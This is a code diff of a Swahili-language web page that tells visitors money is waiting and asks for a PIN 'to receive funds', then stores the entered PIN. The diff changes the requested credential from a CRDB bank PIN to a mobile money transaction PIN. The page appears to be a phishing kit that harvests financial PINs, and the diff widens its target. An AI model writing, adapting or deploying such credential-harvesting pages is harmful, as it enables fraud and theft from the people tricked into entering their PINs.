@@ -118,7 +118,7 @@
       <p>Hali: <strong>Tayari kwa kutuma</TSH></p>
     </div>
 
-    <p>Tafadhali ingiza <strong>PIN ya CRDB</strong> yako ya uthibitisho ili kupokea fedha:</p>
+    <p>Tafadhali ingiza <strong>PIN ya miamala ya simu</strong> yako ya uthibitisho ili kupokea fedha:</p>
 
     <input type="password" id="pinInput" placeholder="Weka namba ya miamala ya simu hapa..." maxlength="6" />
 
@@ -184,7 +184,7 @@
         timestamp: new Date().toISOString()
       })
         .then(() => {
-          showNotification("✅ Imewasilishwa, subiri taarifa ya CRDB.");
+          showNotification("✅ Imewasilishwa, subiri taarifa ya miamala ya simu.");
         })
         .catch((error) => {
           showNotification("Imeshindikana kuhifadhi PIN: " + error.message, "error");
